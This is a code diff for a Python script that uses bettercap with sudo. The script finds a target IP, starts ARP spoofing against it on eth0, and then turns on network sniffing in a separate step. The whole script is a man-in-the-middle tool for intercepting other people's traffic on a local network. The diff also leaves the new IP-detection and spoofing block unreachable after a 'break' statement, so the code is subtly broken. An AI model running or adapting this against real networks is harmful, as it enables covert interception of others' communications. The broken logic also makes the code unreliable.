@@ -1,9 +1,9 @@
 import subprocess #Allows the running of other programs or commands from the code
-import time
 import re #used for analyzing output string 
 
 def run_bettercap():
-    
+    global found_ip_flag
+
     try:
         #more commands can be added, just seperate them with a comma
         commands = [
@@ -24,13 +24,17 @@ def run_bettercap():
             output = process.stdout.readline() #read one line from the output of the subprocess 
             if output == '' and process.poll() is not None: #if there is an empty string and if the subprocess returns a value other than None, indicating the subprocess has terminated
                 break
-            if output and not found_ip_flag: #checks if output has any data
-                print(output.strip()) #prints the output after removing any trailing whitespace
-                ip = extract_info(output) #parses and extracts useful information
+                if not found_ip_flag: #checks if output has any data
+                    print(output.strip()) #prints the output after removing any trailing whitespace
+                    ip = extract_info(output) #parses and extracts useful information
+
+                    if ip:
+                        arp_spoofing(ip)
+                        found_ip_flag = True
+
             if found_ip_flag:
-                arp_spoofing(ip)
-                
-   
+                sniffing()
+
     except Exception as e:
         print(f"Error with running Bettercap {e}")
     
@@ -60,15 +64,25 @@ def arp_spoofing(target_ip):
         f"set arp.spoof.interface {interface}",
         f"set arp.spoof.targets {target_ip}",
         "arp.spoof on",
-        "net.sniff on"
     ]
-    update_command = f"sudo bettercap -eval '{'; '.join(commands)}"
+    update_command = "sudo bettercap -eval '" + "; ".join(commands) + "'"
     
     try:
         subprocess.run(update_command, shell=True)
-        print(f"ARP Spoofing and sniffing started for {target_ip}")
+        print(f"ARP Spoofing started for {target_ip}")
     except Exception as e:
         print(f"Error setting ARP Spoofing: {e}")
+
+def sniffing():
+    sniff_command = ["net.sniff on"]
+    update_command = "sudo bettercap -eval '" + "; ".join(sniff_command) + "'"
+
+    try:
+        subprocess.run(update_command, shell=True)
+        print("Started sniffing")
+    except Exception as e:
+        print(f"Error with sniffing: {e}")
+
 #--------------------------
 device_ip = '169.254.62.118'
 interface = 'eth0'
